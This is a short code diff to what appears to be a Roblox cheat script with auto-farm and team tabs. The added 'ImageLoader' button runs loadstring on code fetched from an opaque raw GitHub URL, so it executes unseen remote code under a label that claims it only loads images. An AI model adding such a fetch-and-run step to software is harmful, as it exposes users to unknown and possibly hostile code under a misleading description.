@@ -772,6 +772,18 @@ AutoFarmTab:Button({
     end
 })
 
+local Tabs = {
+    ImageLoaderTab = Window:Tab({ Title = "ImageLoader", Icon = "image", Desc = "Load and view images." }),
+}
+
+Tabs.ImageLoaderTab:Button({
+    Title = "LoadImageLoader",
+    Desc = "Click to execute Imageloader",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DNCJDNDJDJ/Hghghfhf-tht-tht/refs/heads/main/Ngjgjghthghghbg"))()
+    end
+})
+
 -- Teams Tab
 local TeamsTab = Window:Tab({
     Title = "Teams",
